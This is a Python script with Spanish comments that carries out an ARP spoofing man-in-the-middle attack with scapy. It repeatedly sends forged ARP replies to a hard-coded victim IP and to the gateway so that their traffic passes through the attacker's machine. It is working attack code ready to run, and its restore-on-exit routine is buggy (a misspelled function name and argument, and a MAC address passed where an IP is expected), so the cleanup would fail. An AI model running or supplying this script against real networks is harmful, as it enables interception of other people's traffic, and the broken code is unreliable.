from time import time
import scapy.all as scapy
import time

def get_mac(ip):
    #buscamos ip
    arp_request = scapy.ARP(pdst = ip)
    #tenemos un destino (ff... = mac)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
       
    #sacamos el primer mac de nuestra lista de clientes (0 = primer dato)(1 = respuestas)
    return answered_list[0][1].hwsrc
    

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    #pdst=ip victima - hwdst=mac victima - psrc=gateway router victima
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    #enviamos el paquete a la victima 
    scapy.send(packet, verbose=False)

#funcion para restaurar los datos del arp en la pc de la victima
def restore(dest_ip, source_ip):
    destination_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=destination_mac, psrc=source_mac)
    scapy.sent(packet, count=4, vrbose=False)

#el primer dato es la ip original de la victima y el segundo es el gateway
target_ip  = "192.168.1.68"
gateway_ip = "192.168.1.1"

sent_packet_count = 0
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] PACKET SENT: " + str(sent_packet_count), end = "")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detectado CTRL + C ..... Limpiando tablas ARP ..... Cerrando ARP Spoof")    
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)